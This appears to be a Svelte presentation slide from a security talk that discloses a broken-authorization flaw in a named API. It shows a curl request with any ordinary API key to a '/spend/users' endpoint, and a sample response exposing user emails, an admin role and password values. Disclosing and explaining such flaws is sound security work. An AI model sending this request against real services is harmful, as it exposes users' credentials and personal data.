<script module>
	import { defineProps } from '$lib/index.js'
	export const props = defineProps({})
</script>

<script>
	import { Transition } from '$lib/index.js'
</script>

<div style="display: flex; flex-direction: column; justify-content: center; height: 100%; gap: 1.5rem; padding: 0 2rem;">
	<Transition visible>
		<div style="display: flex; align-items: center; gap: 0.8rem;">
			<span style="font-size: 0.75rem; color: #ef4444; font-weight: 700; background: rgba(239,68,68,0.15); padding: 0.2rem 0.6rem; border-radius: 6px;">STEP 1</span>
			<p style="font-size: 1.8rem; font-weight: 700; color: var(--text);">
				Leak All User Data
			</p>
		</div>
	</Transition>

	<Transition>
		<div style="background: #1a1a2e; padding: 1.2rem 1.5rem; border-radius: 10px; border-left: 3px solid #ef4444;">
			<p style="font-family: var(--r-code-font); font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.4rem;">Request (any normal API key works)</p>
			<p style="font-family: var(--r-code-font); font-size: 0.85rem; color: #34d399;">
				curl -H "Authorization: Bearer sk-YOUR_KEY" \<br />
				&nbsp;&nbsp;"https://api-v2.bonzai.iodigital.com/spend/users"
			</p>
		</div>
	</Transition>

	<Transition>
		<div style="background: #1a1a2e; padding: 1.2rem 1.5rem; border-radius: 10px; border-left: 3px solid #f97316;">
			<p style="font-family: var(--r-code-font); font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.4rem;">Response (1,874 users returned, including...)</p>
			<p style="font-family: var(--r-code-font); font-size: 0.8rem; color: #d4d4d4;">
				{'{'}<br />
				&nbsp;&nbsp;"user_id": "<span style="color: #60a5fa;">admin@iodigital.com</span>",<br />
				&nbsp;&nbsp;"user_role": "<span style="color: #ef4444;">proxy_admin</span>",<br />
				&nbsp;&nbsp;"password": "<span style="color: #ef4444;">a1b2c3d4e5f6g7h8i9j0...</span>",<br />
				&nbsp;&nbsp;"spend": 142.50,<br />
				&nbsp;&nbsp;"max_budget": null<br />
				{'}'}
			</p>
		</div>
	</Transition>

	<Transition>
		<p style="font-size: 1rem; color: #ef4444; font-weight: 600;">
			Bug: No field-level authorization. Password column returned to ALL roles.
		</p>
	</Transition>
</div>
